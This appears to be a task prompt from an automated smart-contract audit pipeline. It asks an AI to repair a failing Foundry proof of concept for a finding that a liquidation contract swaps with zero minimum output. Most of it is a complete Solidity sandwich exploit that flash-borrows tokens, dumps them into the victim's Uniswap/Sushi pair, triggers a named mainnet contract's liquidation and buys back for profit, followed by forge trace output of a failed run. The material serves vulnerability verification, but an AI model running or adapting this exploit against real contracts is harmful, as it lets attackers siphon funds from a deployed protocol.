You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: All token liquidations are sandwichable because `amountOutMin` is hardcoded to zero
- claim: Each liquidation uses `swapExactTokensForETHSupportingFeeOnTransferTokens` with `amountOutMin = 0`, so the contract will accept any amount of ETH for WBTC/USDC/USDT/DAI sales. A searcher can move the relevant Uniswap V2 price against the trade before inclusion and back-run afterward, extracting most of the bounty value as slippage.
- impact: A successful bounty sweep can still be monetized at an arbitrarily bad rate, allowing MEV searchers to siphon away most or all of the recovered value during liquidation. The contract may only realize a small residual amount of ETH while the attacker captures the displaced value.
- exploit_paths: ["Wait until the contract holds one of the hardcoded payout tokens and `executeOnOpportunity()` is about to run", "Front-run by moving the token/WETH Uniswap V2 pair price sharply against the contract", "Let `_swapTokenToEth()` execute with `amountOutMin = 0`", "Back-run to restore price and keep the slippage as profit"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address private constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;

    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant UNI_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNI_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private _profitAmount;
    bool private _executed;
    bool private _validated;

    error InvalidCallback();
    error TargetExecutionFailed();
    error WrongVictimPair();
    error Unprofitable();
    error RepayTransferFailed();
    error RouterBuybackFailed();

    struct Strategy {
        address token;
        address victimRouter;
        address victimFactory;
        address victimPair;
        address lenderPair;
        uint256 borrowAmount;
        uint256 targetBalanceBefore;
    }

    struct SearchResult {
        address lenderPair;
        uint256 lenderReserveToken;
        uint256 borrowAmount;
        uint256 expectedProfit;
    }

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _profitAmount = 0;
        _validated = false;

        uint256 baseEth = address(this).balance;

        address[4] memory payoutTokens = [WBTC, USDC, USDT, DAI];
        address[2] memory routers = [UNI_ROUTER, SUSHI_ROUTER];
        address[2] memory factories = [UNI_FACTORY, SUSHI_FACTORY];

        for (uint256 tokenIndex = 0; tokenIndex < payoutTokens.length; ++tokenIndex) {
            address token = payoutTokens[tokenIndex];
            uint256 targetBal = IERC20(token).balanceOf(TARGET);

            // Path stage 1 precondition: the target must already hold a hardcoded payout token.
            // If all balances are zero at this fork, the sandwich path from the finding is absent.
            if (targetBal == 0) {
                continue;
            }

            for (uint256 routeIndex = 0; routeIndex < routers.length; ++routeIndex) {
                address victimRouter = routers[routeIndex];
                address victimFactory = factories[routeIndex];
                address victimPair = IUniswapV2Factory(victimFactory).getPair(token, WETH);

                // Path stage 2 requires moving the exact token/WETH pair against the target.
                // If this pair does not exist on a candidate router, that route is infeasible.
                if (victimPair == address(0)) {
                    continue;
                }

                SearchResult memory result = _findBestStrategy(token, targetBal, victimPair, victimFactory);
                if (result.lenderPair == address(0) || result.borrowAmount == 0 || result.expectedProfit == 0) {
                    continue;
                }

                Strategy memory strategy = Strategy({
                    token: token,
                    victimRouter: victimRouter,
                    victimFactory: victimFactory,
                    victimPair: victimPair,
                    lenderPair: result.lenderPair,
                    borrowAmount: result.borrowAmount,
                    targetBalanceBefore: targetBal
                });

                uint256 amount0Out = IUniswapV2Pair(result.lenderPair).token0() == token ? result.borrowAmount : 0;
                uint256 amount1Out = amount0Out == 0 ? result.borrowAmount : 0;

                try IUniswapV2Pair(result.lenderPair).swap(amount0Out, amount1Out, address(this), abi.encode(strategy)) {
                    uint256 endingEth = address(this).balance;
                    _profitAmount = endingEth > baseEth ? endingEth - baseEth : 0;
                    _validated = _profitAmount > 0;
                    return;
                } catch {
                    continue;
                }
            }
        }

        _profitAmount = address(this).balance - baseEth;
        _validated = false;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        Strategy memory strategy = abi.decode(data, (Strategy));
        if (msg.sender != strategy.lenderPair) {
            revert InvalidCallback();
        }

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        if (borrowed != strategy.borrowAmount) {
            revert InvalidCallback();
        }

        // exploit_paths[1]: front-run by moving the token/WETH Uniswap V2 pair price sharply against the contract.
        // We do that by borrowing the live payout token and dumping it into the exact liquidation venue.
        _forceApprove(strategy.token, strategy.victimRouter, 0);
        if (!_forceApprove(strategy.token, strategy.victimRouter, borrowed)) {
            revert Unprofitable();
        }

        uint256 ethBeforeFrontRun = address(this).balance;
        _swapTokenToEth(strategy.victimRouter, strategy.token, borrowed);
        uint256 ethAfterFrontRun = address(this).balance;
        uint256 frontRunEth = ethAfterFrontRun - ethBeforeFrontRun;

        uint256 pairTokenBalanceBeforeVictim = IERC20(strategy.token).balanceOf(strategy.victimPair);

        // exploit_paths[2]: let `_swapTokenToEth()` execute with `amountOutMin = 0`.
        // The public target call below is the victim liquidation whose zero-min-out swap is being sandwiched.
        // If this call is not publicly executable at the fork, the exploit path is infeasible.
        (bool ok, ) = TARGET.call(abi.encodeWithSignature("executeOnOpportunity()"));
        if (!ok) {
            revert TargetExecutionFailed();
        }

        uint256 pairTokenBalanceAfterVictim = IERC20(strategy.token).balanceOf(strategy.victimPair);

        // Concrete route check: if the target did not send a meaningful amount of the token into the
        // manipulated token/WETH pair, then this candidate router was not the liquidation venue.
        if (pairTokenBalanceAfterVictim <= pairTokenBalanceBeforeVictim) {
            revert WrongVictimPair();
        }

        uint256 repayAmount = _flashRepayAmount(borrowed);
        (uint256 reserveTokenAfter, uint256 reserveWethAfter) = _tokenWethReserves(strategy.victimPair, strategy.token);
        uint256 buybackCost = _getAmountIn(repayAmount, reserveWethAfter, reserveTokenAfter);
        if (frontRunEth <= buybackCost) {
            revert Unprofitable();
        }

        // exploit_paths[3]: back-run to restore price, repay the flash-borrowed inventory, and keep the spread.
        _buyExactTokenWithEth(strategy.victimRouter, strategy.token, repayAmount, buybackCost);
        if (!_safeTransfer(strategy.token, strategy.lenderPair, repayAmount)) {
            revert RepayTransferFailed();
        }

        uint256 dust = IERC20(strategy.token).balanceOf(address(this));
        if (dust > 0) {
            _forceApprove(strategy.token, strategy.victimRouter, 0);
            if (_forceApprove(strategy.token, strategy.victimRouter, dust)) {
                _swapTokenToEth(strategy.victimRouter, strategy.token, dust);
            }
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _validated;
    }

    function executed() external view returns (bool) {
        return _executed;
    }

    function _findBestStrategy(
        address token,
        uint256 victimAmount,
        address victimPair,
        address victimFactory
    ) internal view returns (SearchResult memory best) {
        (uint256 targetReserveToken, uint256 targetReserveWeth) = _tokenWethReserves(victimPair, token);
        if (targetReserveToken == 0 || targetReserveWeth == 0) {
            return best;
        }

        (address lenderPair, uint256 lenderReserveToken) = _findBestLenderPair(token, victimPair, victimFactory);
        if (lenderPair == address(0) || lenderReserveToken == 0) {
            return best;
        }

        uint256 maxBorrow = lenderReserveToken * 95 / 100;
        uint256 pairCap = targetReserveToken * 80 / 100;
        if (pairCap < maxBorrow) {
            maxBorrow = pairCap;
        }
        if (maxBorrow == 0) {
            return best;
        }

        for (uint256 i = 0; i < 10; ++i) {
            uint256 borrowAmount = _candidateBorrowAmount(i, victimAmount, maxBorrow);
            if (borrowAmount == 0 || borrowAmount > maxBorrow) {
                continue;
            }

            uint256 expected = _simulateSandwichProfit(
                targetReserveToken,
                targetReserveWeth,
                victimAmount,
                borrowAmount
            );
            if (expected > best.expectedProfit) {
                best = SearchResult({
                    lenderPair: lenderPair,
                    lenderReserveToken: lenderReserveToken,
                    borrowAmount: borrowAmount,
                    expectedProfit: expected
                });
            }
        }
    }

    function _candidateBorrowAmount(
        uint256 index,
        uint256 victimAmount,
        uint256 maxBorrow
    ) internal pure returns (uint256) {
        if (index == 0) return victimAmount;
        if (index == 1) return victimAmount * 2;
        if (index == 2) return victimAmount * 5;
        if (index == 3) return victimAmount * 10;
        if (index == 4) return maxBorrow / 50;
        if (index == 5) return maxBorrow / 20;
        if (index == 6) return maxBorrow / 10;
        if (index == 7) return maxBorrow / 5;
        if (index == 8) return maxBorrow / 3;
        if (index == 9) return maxBorrow / 2;
        return 0;
    }

    function _findBestLenderPair(
        address token,
        address victimPair,
        address victimFactory
    ) internal view returns (address bestPair, uint256 bestReserveToken) {
        (bestPair, bestReserveToken) = _scanLenderFactory(token, victimPair, victimFactory, bestPair, bestReserveToken);

        address alternateFactory = victimFactory == UNI_FACTORY ? SUSHI_FACTORY : UNI_FACTORY;
        (bestPair, bestReserveToken) = _scanLenderFactory(
            token,
            victimPair,
            alternateFactory,
            bestPair,
            bestReserveToken
        );
    }

    function _scanLenderFactory(
        address token,
        address victimPair,
        address factory,
        address currentBestPair,
        uint256 currentBestReserveToken
    ) internal view returns (address bestPair, uint256 bestReserveToken) {
        bestPair = currentBestPair;
        bestReserveToken = currentBestReserveToken;

        for (uint256 i = 0; i < 5; ++i) {
            address other = _counterpartAt(i);
            if (other == token) {
                continue;
            }

            address pair = IUniswapV2Factory(factory).getPair(token, other);
            if (pair == address(0) || pair == victimPair) {
                continue;
            }

            uint256 reserveToken = _pairReserveForToken(pair, token);
            if (reserveToken > bestReserveToken) {
                bestReserveToken = reserveToken;
                bestPair = pair;
            }
        }
    }

    function _counterpartAt(uint256 index) internal pure returns (address) {
        if (index == 0) return WETH;
        if (index == 1) return USDC;
        if (index == 2) return USDT;
        if (index == 3) return DAI;
        return WBTC;
    }

    function _simulateSandwichProfit(
        uint256 reserveToken,
        uint256 reserveWeth,
        uint256 victimAmount,
        uint256 borrowAmount
    ) internal pure returns (uint256) {
        if (victimAmount == 0 || borrowAmount == 0) {
            return 0;
        }

        uint256 frontRunEth = _getAmountOut(borrowAmount, reserveToken, reserveWeth);
        if (frontRunEth == 0 || frontRunEth >= reserveWeth) {
            return 0;
        }

        uint256 reserveToken1 = reserveToken + borrowAmount;
        uint256 reserveWeth1 = reserveWeth - frontRunEth;

        uint256 victimEth = _getAmountOut(victimAmount, reserveToken1, reserveWeth1);
        if (victimEth == 0 || victimEth >= reserveWeth1) {
            return 0;
        }

        uint256 reserveToken2 = reserveToken1 + victimAmount;
        uint256 reserveWeth2 = reserveWeth1 - victimEth;

        uint256 repayAmount = _flashRepayAmount(borrowAmount);
        if (repayAmount >= reserveToken2) {
            return 0;
        }

        uint256 buybackCost = _getAmountIn(repayAmount, reserveWeth2, reserveToken2);
        if (buybackCost >= frontRunEth) {
            return 0;
        }

        return frontRunEth - buybackCost;
    }

    function _swapTokenToEth(address router, address token, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _buyExactTokenWithEth(address router, address token, uint256 amountOut, uint256 maxEthIn) internal {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        try IUniswapV2Router02(router).swapETHForExactTokens{value: maxEthIn}(
            amountOut,
            path,
            address(this),
            block.timestamp
        ) {
        } catch {
            revert RouterBuybackFailed();
        }
    }

    function _tokenWethReserves(address pair, address token) internal view returns (uint256 reserveToken, uint256 reserveWeth) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == token) {
            reserveToken = reserve0;
            reserveWeth = reserve1;
        } else {
            reserveToken = reserve1;
            reserveWeth = reserve0;
        }
    }

    function _pairReserveForToken(address pair, address token) internal view returns (uint256 reserveToken) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        reserveToken = IUniswapV2Pair(pair).token0() == token ? reserve0 : reserve1;
    }

    function _flashRepayAmount(uint256 borrowed) internal pure returns (uint256) {
        return (borrowed * 1000) / 997 + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return type(uint256).max;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
15898795567 [1.589e10]
    │   │   │   │   ├─ [63487] 0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58::swap(0, 1063304620646357963568 [1.063e21], 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, 0x)
    │   │   │   │   │   ├─ [29962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F, 1063304620646357963568 [1.063e21])
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000ceff51756c56ceffca006cd410b03ffc46dd3a58
    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000d9e1ce17f2641f24ae83637ab66a2cca9c378b9f
    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000039a450ded939a69330
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 15898795567 [1.589e10]
    │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 4724544754649542614657 [4.724e21]
    │   │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000003b3a45e2f0000000000000000000000000000000000000000000001001e3ac6a4910ade81
    │   │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000d9e1ce17f2641f24ae83637ab66a2cca9c378b9f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000d9e1ce17f2641f24ae83637ab66a2cca9c378b9f
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000ae85938e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000039a450ded939a69330
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1063304620646357963568 [1.063e21]
    │   │   │   │   ├─ [9235] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(1063304620646357963568 [1.063e21])
    │   │   │   │   │   ├─ [95] 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F::fallback{value: 1063304620646357963568}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000d9e1ce17f2641f24ae83637ab66a2cca9c378b9f
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000039a450ded939a69330
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [67] FlawVerifier::receive{value: 1063304620646357963568}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0xCEfF51756c56CeFFCA006cD410B03FFC46dd3a58) [staticcall]
    │   │   │   │   └─ ← [Return] 15898795567 [1.589e10]
    │   │   │   ├─ [1400] 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe::executeOnOpportunity()
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] TargetExecutionFailed()
    │   │   └─ ← [Revert] TargetExecutionFailed()
    │   ├─ [9839] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [240] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [362] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe.executeOnOpportunity
  at FlawVerifier.uniswapV2Call
  at 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.14s (3.92s CPU time)

Ran 1 test suite in 4.22s (4.14s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 624242)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
